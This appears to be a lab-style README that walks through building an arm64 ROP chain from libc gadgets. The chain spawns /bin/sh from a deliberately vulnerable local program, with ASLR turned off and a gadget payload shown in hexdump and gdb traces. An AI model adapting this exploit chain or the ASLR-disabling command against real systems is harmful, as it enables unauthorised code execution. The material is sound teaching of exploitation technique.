# arm64_rop_exploit

arm64 rop gadget binary to map arm64 reverse shell code into memory and execute code

## This will only work on target arm64 device. 

Source code for mapping rop gadget into memory and executing the shell code from libc library.
The arm64 code was tested on a Raspberry Pi running Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1062-raspi2 aarch64).

## License

Please see the [LICENSE](LICENSE) file for the exact details.

## rop.py

## About

This project will go into exploitation of vulnerabilities and the usage of return oriented programming. This will build upon injecting shell code for exploitation.  

Inpiration for this project was from the following blog:

https://blog.perfect.blue/ROPing-on-Aarch64

However, this blog had some very useful gadgets, but could not locate a solution pointed to from the blog.  So, decided to build upon this and design a project using some of the gadgets from to this rop blog.

In a process protected by DEP (Data Execution Prevention) - there shouldn't be any part which is executable and writeable at the same time: Libraries and .text segments have only read and execute permissions (r-x), .data, stack and heap are read and write only (rw-).

In the case of a buffer overflow an attacker is able to write more data then expected by the developers into a buffer located either on the stack or the heap - into memory regions which are only (rw-). Therefore an attacker can inject his own code into the process, but neither can hijack the execution flow nor execute arbitrary commands, like shellcode. By using a technique called ROP – Return Oriented Programming – an attacker nonetheless can gain back many possibilities, we lost due to DEP. The following sections will explain how.

The basic idea of ROP: search in executable sections of the vulnerable binary (.text, mapped libraries) to find gadgets. A gadget consist of any number of instructions, which the last one let us further control the execution flow (e.g. chain multiple gadgets, therefore let's call them chaining instructions). The other instructions or parts of the gadget will help us to full fill – step by step – our main goal. If your goal is complex, the ROP chain can get pretty long.

Now starts the interesting part. How do we find ROP gadgets in Aarch64?  Install ropper, below:

https://github.com/sashs/Ropper
       
Fortunately for us, ropper supports Aarch64. But what kind of gadgets exist in Aarch64 and how can we use them?
       
    $ ropper -f libc-2.27.so -–nocolor > libc_rop.txt
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%      
    Gadgets
    =======      
    0x00091ac4: add sp, sp, #0x140; ret; 
    0x000bf0dc: add sp, sp, #0x150; ret; 
    0x000c0aa8: add sp, sp, #0x160; ret; 
    ....
       
Most of the these are actually not very useful as the ret depends on the x30 register. The address in x30 is where the gadget will return when it executes a ret.

If the gadget doesn’t modify x30 in a way we can control it, we won’t be able to control the execution flow and get to the next gadget.

So to get a ROP-chain running in Aarch64, we can only use the gadgets which:

set the input registers for the input parameters to the function to call

    perform the function we want
    pop x30 from the stack
    ret

This project will continue exploitation of vulnerabilities in the stack-overflow program.  
The stack-overflow code is build as shown below.
       
    $ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
    $ scp stack-overflow ubuntu@169.254.251.49:/home/ubuntu/download/stack-overflow
       
Program stack-overflow execution is shown below.
       
    $ ./stack-overflow-gets 
    0xfffffffff3a8
    What's your name?
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
    *** stack smashing detected ***: <unknown> terminated
    Aborted

Stack smashing was detected, now it will be removed and executed again.  However, note now the execute stack is disabled.  ROP does not inject and execute code on the stack as in the previous example, but instead chains the gadgets located in the libc library.
       
In the CmakeList.txt uncomment the following

    # set C flags
    set (CMAKE_C_FLAGS "-fno-stack-protector")
    # set linker flags
    # set (CMAKE_EXE_LINKER_FLAGS "-z execstack")

The stack-overflow code is build as shown below.
       
    $ cmake -DCMAKE_TOOLCHAIN_FILE=~/toolchain-aarch64-linux-gnu.cmake .. && make
    $ scp stack-overflow-gets ubuntu@169.254.251.49:/home/ubuntu/stack-overflow

Next, execute the program disabling ALSR, so the same address will appear on subsequent running of the program.  Program stack-overflow execution is shown below.  Note the stack smashing is disabled.

    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    $./stack-overflow-gets 
    0xfffffffff3b0
    What's your name?
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
    Bus error
    
This chapter will use the program stack-overflow-gets exploited previously, but now using a ROP chain exploiting the program.  The following shows execution of the exploitable program using the gdb debugger.  Note the address 0xfffffffff330 which is the exploitation address.  This will be used in the ROP chain binary.
       
    $ gdb ./stack-overflow-gets 
    Reading symbols from ./stack-overflow-gets...(no debugging symbols found)...done.
    gef➤  break main
    Breakpoint 1, 0x0000aaaaaaaaaac4 in main ()
    gef➤  continue
    Continuing.
    0xfffffffff330
    What's your name?
    Hello, !
    [Inferior 1 (process 31778) exited normally]
    
Get the map of the victim stack overflow executable.  Note the address of beginning of the libc execution address 0x0000fffff7e78000.  This will be used in the ROP chain binary.

    gef➤  vmmap
    [ Legend:  Code | Heap | Stack ]
    Start              End                Offset             Perm Path
    0x0000fffff7e78000 0x0000fffff7fb8000 0x0000000000000000 r-x /lib/aarch64-linux-gnu/libc-2.27.so
    0x0000fffff7fb8000 0x0000fffff7fc7000 0x0000000000140000 --- /lib/aarch64-linux-gnu/libc-2.27.so
    0x0000fffff7fc7000 0x0000fffff7fcb000 0x000000000013f000 r-- /lib/aarch64-linux-gnu/libc-2.27.so
    0x0000fffff7fcb000 0x0000fffff7fcd000 0x0000000000143000 rw- /lib/aarch64-linux-gnu/libc-2.27.so
    gef> quit

The purpose of this exploit is to use specific ROP gadgets to begin execution upon returning from the exploited function.  These ROP gadgets are executed in a ROP chain on the stack to perform a specific function.  In this case the ROP chain will be setup to call execve from the ROP chain.  But prior to execution of execve needs to have the proper input parameters.  These input parameters conform to the ARM64 program execution convention.  This execve function requires three parameters as shown below:
       
    int __cdecl execve(char * __path, char * * __argv, char 
    int               w0:4           <RETURN>
    char *            x0:8           __path
    char * *          x1:8           __argv
    char * *          x2:8           __envp                                      

In the calling convention x0 contains a pointer to the path.  In this case it will point an address containing a pointer to the location of the /bin/sh string.  Registers x1 and x2 will just contain 0x0 or null.  So, the ROP gadgets must be chained to set these registers as follows and call the execve function.

Select the first gadget from the libc library.  It essentially loads x0 from x29+0x18 and then pops x29 and x30 from the top of the stack (ldp xx,xy [sp] is essentially equal to popping).  It then moves stack down by 0x20 (sp+0x20 in post indexed addressing).   The following shows how the address of the gadget is calculated from the libc base address.
       
    /lib/aarch64-linux-gnu/libc-2.27.so
    0x00062554: ldr x0, [x29, #0x18]; ldp x29, x30, [sp], #0x20; ret;
    libc base address 0x0000fffff7e78000
    gadget 1:                      62554
                    =  0x0000fffff7eda554

Additional ROP gadgets are selected in the same manner as the first gadget shown above.  The following ROP gadgets were chosen to be chained together.  They were chosen to set the registers for execution of libc execve function.  This can be adopted to call other functions using another set of parameters.

Function calls adhere to the Procedure Call Standard for Arm64 Architecture.  Some of the key points are listed below:

    Calls to In addition to these PC-relative instructions, A64 includes two absolute branches. The BR Xn
    instruction performs an absolute branch to the address in Xn while BLR Xn has the same effect, but
    also stores the return address in X30 (the link register). The RET instruction behaves like BR Xn,
    but it hints to branch prediction logic that it is a function return. RET branches to the address in
    X30 by default, though other registers can be specified.

Stack and calling conventions

    • The registers x0 to x7 are used to pass parameters to subroutines and extra parameters are passed on the stack.

    • The return address is stored in x30, but during nested subroutine calls, it gets preserved on the stack. It is also known as the link register.

    • The x29 register is also known as the frame pointer . All the local variables on the stack are accessed relative to x29 and it holds a pointer to the previous stack frame.

The ROP gadgets selected from the Ropper shown below.  These were selected based upon the ability to manage the input registers and to chain execution to the next ROP gadget.
       
    ROP gadgets
    g0 - 0x00062524: ldr x0, [x29, #0x18]; ldp x29, x30, [sp], #0x20; ret; 
    g1 - 0x000ed2d0: mov x1, x0; ret; 
    g2 - 0x0006dd44: ldp x29, x30, [sp], #0x30; br x3;
    g3 - 0x0003f8a0: ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23,
                    x24, [sp, #0x30]; ldp x29, x30, [sp], #0x40; ret; 
    g4 - 0x00026dc4: mov x3, x19; mov x2, x26; blr x20;
    g5 - 0x000a2b60: execve                      
    The following illustrates how the gadgets are chained to execute the ROP chain.
    
    gadget_0 is called and x0 is set to 0x0 (x1 value) and x30 returns to gadget_3
    gadget_3 is called to make x19 = gadget_1 and x20 = gadget_2 return to gadget_4
            from gadget_3, making x3 = x19 (gadget_1)
    gadget_4 calls x20 (gadget_2)
    gadget_2 gives us a controlled x30 and jumps to x3 (gadget_1)
    gadget_1 moves x0 (0x0) into x1 and returns
    gadget_0 moves pointer to /bin/sh into x0 and returns with a call to gadget_5
    gadget_5 calls execve with x0 pointing to /bin/sh and x1 and x2 containing 0x0
    
The following shows the sequence of execution and the register values that get set as the gadgets are executed.
       
    g0 - x0 <- x29 + 0x18, pop x29, x30 (0x40), ret to g3
    g3 - x19 <- g1, x20 <- g2, x21 <- x2 (value), pop x29, x30 (0x40), ret to g4
    g4 - x3 <- x19 (g1), x2, x26 (maybe zero?), blr x20 (g2)
    g2 - pop x29, x30 (0x40), ret to (g0) br x3 (g1)
    g1 - x1 <- x0, ret to g0
    g0 - x0 <- x29 + 0x18, pop x29, x30 (0x20) ret to call execve
    g5 – execve

    x0 <- 0, pointer to (/bin/sh)
    x1 <- 0
    x2 <- 0
    x3 <- x19 (g1)
    x19 <- sp 0x10 -> g1
    x20            -> g2
    x21 <- sp 0x20 -> x2
    x22
    x23 <- sp 0x30
    x24
    x26 
    x29 <- sp 0x40
    x30 <- g3, g4

## Building 

Decided to create a program written in Python to create an binary image containing the ROP chain and linkage between the chains and the parameters required.  This will be a fundamental ROP compiler that is adaptable to create other ROP chains.  First, a file is created containing to the ROP gadgets ordered by their call sequence.  Each entry contains the gadget  libc address and the gadget assembly instruction.  The following is rop sequence file that will be used as an input to the ROP compiler.
       
    $ cat rop_sequence 
    g0 - 0x00062524: ldr x0, [x29, #0x18]; ldp x29, x30, [sp], #0x20; ret; 
    g3 - 0x0003f8a0: ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23,
                    x24, [sp, #0x30]; ldp x29, x30, [sp], #0x40; ret;
    g4 - 0x00026dc4: mov x3, x19; mov x2, x26; blr x20;
    g2 - 0x0006dd44: ldp x29, x30, [sp], #0x30; br x3;
    g1 - 0x000ed2d0: mov x1, x0; ret;  
    g0 - 0x00062524: ldr x0, [x29, #0x18]; ldp x29, x30, [sp], #0x20; ret;

The Python source for the ROP compiler can be found in the appendix.  The input parameters for the ROP compiler are the rop sequence file above, an output file containing the hexadecimal byte sequence   for exploitation.  The last two parameter that can change on execution are the address of the libc library in execution memory and the address of the exploit.  The following shows how to determine these two addresses with the gdb debugger.  Note these addresses may change when not running the debugger and these examples will also follow.  The following show the execution of the ROP complier and creating binary output buffer for ROP execution in the exploit.
       
    $ python rop.py -i rop_sequence -o bin_sh.hex -l 0x0000fffff7e77000 -e 0xfffffffff330
    Input file: " rop_sequence
    Output file: " bin_sh.hex
    libc addres: " 281474840883200
    exploit address: " 281474976707376
    Hexadecimal form of libc: 281474840883200 is fffff7e77000
    Hexadecimal form of exploit: 281474976707376 is fffffffff330
    exploit eAddr: 0xfffffffff330
    stack address: 0xfffffffff370
    more debug follows…
    $ $ ( ( cat bin_sh.hex ) | xxd -r -p ; cat ) > bin_sh.bin
    ^C

    $ hexdump -v bin_sh.bin
    0000000 0000 0000 0000 0000 0000 0000 0000 0000
    0000010 0000 0000 0000 0000 0000 0000 0000 0000
    0000020 0000 0000 0000 0000 0000 0000 0000 0000
    0000030 0000 0000 0000 0000 0000 0000 0000 0000
    0000040 f380 ffff ffff 0000 9524 f7ed ffff 0000
    0000050 f3a0 ffff ffff 0000 68a0 f7eb ffff 0000
    0000060 0000 0000 0000 0000 0000 0000 0000 0000
    0000070 f3e0 ffff ffff 0000 ddc4 f7e9 ffff 0000
    0000080 42d0 f7f6 ffff 0000 4d44 f7ee ffff 0000
    0000090 0000 0000 0000 0000 0000 0000 0000 0000
    00000a0 0000 0000 0000 0000 0000 0000 0000 0000
    00000b0 f410 ffff ffff 0000 9524 f7ed ffff 0000
    00000c0 0000 0000 0000 0000 0000 0000 0000 0000
    00000d0 0000 0000 0000 0000 0000 0000 0000 0000
    00000e0 f430 ffff ffff 0000 9b60 f7f1 ffff 0000
    00000f0 622f 6e69 732f 0068 f420 ffff ffff 0000
    0000100
    $ scp bin_sh.bin ubuntu@169.254.251.49:/home/ubuntu/stack-overflow

## Testing Shell Code Exploition

Various debugging techiques will now be presented.  First the ROP chain will be traversed using the debugger.  Insure that the libc starting address and exploit address are entered when creating the compiled ROM binary.

Now the program can be exploited using the debugger to step between Below, find how to run the gadgets in the ROP chain.
       
    $ gdb ./stack-overflow-gets 
    Reading symbols from ./stack-overflow-gets...(no debugging symbols found)...done.
    gef➤  break main
    Breakpoint 1 at 0xac4
    gef➤  break *0xaaaaaaaaaacc
    Breakpoint 2 at 0xaaaaaaaaaacc
    gef➤  run < bin_sh.bin       
    gef➤  continue      
    will break at 0xaaaaaaaaaacc
       
This will break right before the return from the function.  The output from the debugger is displayed below.  At this point our ROP binary has set the stack to load the address of the first gadget into register  x30.  Perform multiple gdb (si) commands to step through into the first gadget.  This can be followed using additonal (si) command to traverse through and verify all the gadgets in the chain are called.
       
      0xaaaaaaaaaac0 <main+4>         mov    x29,  sp
      0xaaaaaaaaaac4 <main+8>         bl     0xaaaaaaaaaa74 <func>
      0xaaaaaaaaaac8 <main+12>        mov    w0,  #0x0                   	// #0
    → 0xaaaaaaaaaacc <main+16>        ldp    x29,  x30,  [sp],  #16
      0xaaaaaaaaaad0 <main+20>        ret    
    Breakpoint 2, 0x0000aaaaaaaaaacc in main ()
    gef➤  si
    gef➤  si
    
The program should now point to the first instruction of gadget 0.

    → 0xfffff7ed9524 <_IO_cookie_seek+60> ldr    x0,  [x29,  #24]
      0xfffff7ed9528 <_IO_cookie_seek+64> ldp    x29,  x30,  [sp],  #32
      0xfffff7ed952c <_IO_cookie_seek+68> ret    
    gef➤  si

Continue stepping through all the gadgets verifying the results in the ROP sequence.  This should be followed with a call to gadget 3, then gadget 4, gadget 2, gadget 1, gadget 0 and finally gadget 5.

    → 0xfffff7eb68a0 <try+136>        ldp    x19,  x20,  [sp,  #16]   (gadget 3)
      0xfffff7eb68a4 <try+140>        ldp    x21,  x22,  [sp,  #32]
      0xfffff7eb68a8 <try+144>        ldp    x23,  x24,  [sp,  #48]
      0xfffff7eb68ac <try+148>        ldp    x29,  x30,  [sp],  #64
      0xfffff7eb68b0 <try+152>        ret
    gef➤  si  (multiple), gadget 4 follows
    → 0xfffff7e9ddc4 <__gconv_transform_internal_ucs2+380> mov    x3,  x19
      0xfffff7e9ddc8 <__gconv_transform_internal_ucs2+384> mov    x2,  x26
      0xfffff7e9ddcc <__gconv_transform_internal_ucs2+388> blr    x20
    gef➤  si  (multiple), gadget 2 follows
    → 0xfffff7ee4d44 <_IO_file_xsgetn_maybe_mmap+92> ldp    x29,  x30,  [sp],  #48
      0xfffff7ee4d48 <_IO_file_xsgetn_maybe_mmap+96> br     x3
    gef➤  si  (multiple), gadget 1 follows
    → 0xfffff7f642d0 <__deadline_from_timeval+120> mov    x1,  x0
      0xfffff7f642d4 <__deadline_from_timeval+124> ret 
    gef➤  si  (multiple), gadget 0 follows
    → 0xfffff7ed9524 <_IO_cookie_seek+60> ldr    x0,  [x29,  #24]
      0xfffff7ed9528 <_IO_cookie_seek+64> ldp    x29,  x30,  [sp],  #32
      0xfffff7ed952c <_IO_cookie_seek+68> ret 
    gef➤  si  (multiple), gadget 5 follows
    → 0xfffff7f19b60 <execve+0>       mov    x8,  #0xdd                 // #221
      0xfffff7f19b64 <execve+4>       svc    #0x0
      0xfffff7f19b68 <execve+8>       cmn    x0,  #0xfff
      0xfffff7f19b6c <execve+12>      b.cs   0xfffff7f19b74 <execve+20>  // b.hs, 
      0xfffff7f19b70 <execve+16>      ret
    Registers
    $x0  : 0x0000fffffffff420  →  0x0068732f6e69622f ("/bin/sh"?)
    $x1  : 0x0               
    $x2  : 0x0
    gef➤  si  (multiple), execve /bin/sh  
    0x0000fffff7f19b64	78	in ../sysdeps/unix/syscall-template.S
    gef➤  si
    process 32482 is executing new program: /bin/dash
    Error in re-setting breakpoint 1: Function "main" not defined.
    [Inferior 1 (process 32482) exited normally]
                  
The above shows a successful execution of the shell code.  However, a new shell cannot be displayed using the debugger.  Stepping through the debugger just verifies the ROP code execution.  Next, the program will be executed outside the debugger using strace to verify execution.  First run the program on the command line and note the new exploitation address without the debugger.
       
    $ ./stack-overflow-gets 
    0xfffffffff390
    What's your name?
    eee
    Hello, eee!
    Go through the steps shown above again the create a new ROP binary using this new exploitation address.  But this time use strace to display the system call performed during execution.
    
    $ strace ./stack-overflow-gets < bin_sh.bin
    execve("./stack-overflow-gets", ["./stack-overflow-gets"], 0xfffffffff520 /* 21 vars */) = 0
    brk(NULL)                               = 0xaaaaaaabc000
    ...
    fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
    brk(NULL)                               = 0xaaaaaaabc000
    brk(0xaaaaaaadd000)                     = 0xaaaaaaadd000
    write(1, "0xfffffffff390\n", 150xfffffffff390
    )        = 15
    write(1, "What's your name?\n", 18What's your name?
    )     = 18
    fstat(0, {st_mode=S_IFREG|0644, st_size=256, ...}) = 0
    read(0, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 256
    read(0, "", 4096)                       = 0
    write(1, "Hello, !\n", 9Hello, !
    )               = 9
    execve("/bin/sh", NULL, NULL)           = 0
    brk(NULL)                               = 0xaaaaaaad8000
 
Note that execve /bin/sh is executed as indicated by the strace log.  Now, the program can be executed to create a command execution shell.  Note that no prompt is displayed, however a shell has been exposed to the user.  This std input is made possible by the cat command and is not using the terminal (/dev/tty).
       
    $ (cat bin_sh.bin; cat) | ./stack-overflow-gets
    0xfffffffff3a0
    What's your name?
    Hello, !
    pwd
    /home/ubuntu/download/stack-overflow
    id
    uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(lxd),111(netdev)
    whoami
    ubuntu
    exit
    $ 
